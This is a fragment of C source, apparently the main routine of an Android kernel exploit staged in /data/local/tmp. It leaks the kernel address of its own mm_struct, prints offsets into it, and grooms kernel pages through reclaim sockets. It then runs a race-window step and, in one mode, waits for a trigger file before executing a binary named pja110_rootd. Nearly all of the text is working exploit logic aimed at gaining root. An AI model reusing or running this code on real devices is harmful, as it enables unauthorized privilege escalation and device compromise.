  page_sz = (size_t)sysconf(_SC_PAGESIZE);
  g_mode = MODE_LEAK;
  if (argc > 1) {
    if (!strcmp(argv[1], "leak")) g_mode = MODE_LEAK;
    else if (!strcmp(argv[1], "page")) g_mode = MODE_PAGE;
    else if (!strcmp(argv[1], "ks")) g_mode = MODE_KS;
    else if (!strcmp(argv[1], "ks-target")) { g_mode = MODE_KS; g_cons_lock_target = 1; }
    else {
      printf("[e1c5] usage: e1c5_ks_window [leak|page|ks|ks-target]\n");
      return 1;
    }
  }
  printf("[e1c5] pid=%d uid=%d page=%zu mode=%d nproc=%ld\n",
         getpid(), getuid(), page_sz, g_mode, sysconf(_SC_NPROCESSORS_ONLN));
  set_limit();
  pin_to_core(CORE);

  if (g_mode == MODE_LEAK) {
    uintptr_t mm = leak_own_mm(1);
    uintptr_t mm2;
    char statm[128];
    int fd;
    printf("[e1c5] LEAK_DONE mm=0x%lx\n", (unsigned long)mm);
    if (mm == (uintptr_t)-1 || mm == 0)
      return 2;
    printf("[e1c5] 8.35 dest total_vm=0x%lx owner=0x%lx\n",
           (unsigned long)(mm + 0xd0), (unsigned long)(mm + 0x348));
    mm2 = leak_own_mm(1);
    printf("[e1c5] LEAK2 mm=0x%lx match=%d\n", (unsigned long)mm2, mm2==mm);
    fd = open("/proc/self/statm", 0);
    if (fd >= 0) {
      int n = read(fd, statm, sizeof(statm)-1);
      if (n < 0) n = 0;
      statm[n] = 0;
      close(fd);
      printf("[e1c5] statm %s", statm);
    }
    printf("[e1c5] holding pid=%d wait pja110_go then exec rootd\n", getpid());
    fflush(stdout);
    {
      FILE *pf = fopen("/data/local/tmp/pja110_hold.pid", "w");
      if (pf) { fprintf(pf, "%d\n", getpid()); fclose(pf); chmod("/data/local/tmp/pja110_hold.pid", 0666); }
    }
    while (access("/data/local/tmp/pja110_go", F_OK) != 0)
      sleep(1);
    execl("/data/local/tmp/pja110_rootd", "pja110_rootd", (char *)0);
    return 0;
  }

  uintptr_t base = prepare_kernel_page();
  if (!base) {
    printf("[e1c5] PAGE_FAIL\n");
    return 3;
  }
  printf("[e1c5] PAGE_OK base=0x%lx lock=0x%lx parent=0x%lx mm=0x%lx\n",
         (unsigned long)base, g_lock_q, g_parent_q, g_mm_struct);
  dump_reclaim("after_page_peek", 1);
  if (g_mode == MODE_PAGE) {
    printf("[e1c5] holding reclaim sockets 15s then exit\n");
    sleep(15);
    dump_reclaim("page_hold_recv", 0);
    printf("[e1c5] PAGE_HOLD_DONE\n");
    return 0;
  }

  g_proxy_fd = recv_proxy_fd();
  if (g_proxy_fd < 0) return 1;
  dump_reclaim("before_window_peek", 1);
  test_window();
  dump_reclaim("after_window_recv", 0);
  wr_file("/data/local/tmp/fusestall.quit", "1\n");
  printf("[e1c5] done\n");
  return 0;
}
